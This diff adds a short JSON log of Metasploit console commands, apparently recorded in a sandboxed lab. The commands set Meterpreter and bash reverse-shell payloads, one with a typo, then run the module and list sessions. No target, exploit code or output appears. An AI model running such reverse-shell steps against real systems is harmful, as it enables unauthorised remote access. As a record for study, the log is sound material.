@@ -1,0 +1,6 @@
+{"sandbox_id": "401", "timestamp_str": "2019-08-14T16:00:52.399951Z", "cmd_type": "msf-command", "cmd": "set payload linux/meterpreter/revese_tcp"}
+{"sandbox_id": "401", "timestamp_str": "2019-08-14T16:01:01.556561Z", "cmd_type": "msf-command", "cmd": "set payload linux/meterpreter/reverse_tcp"}
+{"sandbox_id": "401", "timestamp_str": "2019-08-14T16:01:42.117952Z", "cmd_type": "msf-command", "cmd": "set payload cmd/unix/reverse_bash"}
+{"sandbox_id": "401", "timestamp_str": "2019-08-14T16:01:45.637749Z", "cmd_type": "msf-command", "cmd": "show options "}
+{"sandbox_id": "401", "timestamp_str": "2019-08-14T16:01:50.558084Z", "cmd_type": "msf-command", "cmd": "run"}
+{"sandbox_id": "401", "timestamp_str": "2019-08-14T16:02:23.484154Z", "cmd_type": "msf-command", "cmd": "sessions "}
